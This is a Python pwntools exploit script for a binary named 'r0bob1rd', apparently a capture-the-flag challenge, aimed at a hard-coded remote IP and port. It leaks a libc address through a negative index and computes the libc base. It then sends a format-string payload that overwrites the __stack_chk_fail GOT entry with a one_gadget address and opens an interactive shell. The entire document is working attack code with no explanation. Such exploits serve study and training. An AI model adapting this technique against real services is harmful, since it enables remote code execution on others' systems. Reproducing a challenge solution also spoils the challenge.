from pwn import *

class RoboBirds:
    context.binary = './r0bob1rd'
    context.log_level = 'DEBUG'

    host = '94.237.121.174'
    port = 54114
    conn = remote(host, port)

    def send(self):
        try:
            self.conn.sendlineafter(b'>', b'-8')
            
            self.conn.recvuntil(b'sen: ')
            get_address = unpack(self.conn.recv(6).ljust(8, b'\x00'))

            libc = ELF('glibc/libc.so.6', checksec=False)
            libc.address = get_address - libc.sym['setvbuf']

            gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
            one_gadget = libc.address + gadgets[1]

            elf = ELF('./r0bob1rd', checksec=False)
            payload = fmtstr_payload(8, {elf.got["__stack_chk_fail"]: one_gadget}, write_size="short")
            self.conn.sendlineafter(b'>', payload.ljust(106, b'\x90'))

            self.conn.interactive()

        except Exception as e:
            print(f'[!] Error: {e}')
        finally:    
            self.conn.close()

if __name__ == '__main__':
    RoboBirds().send()  
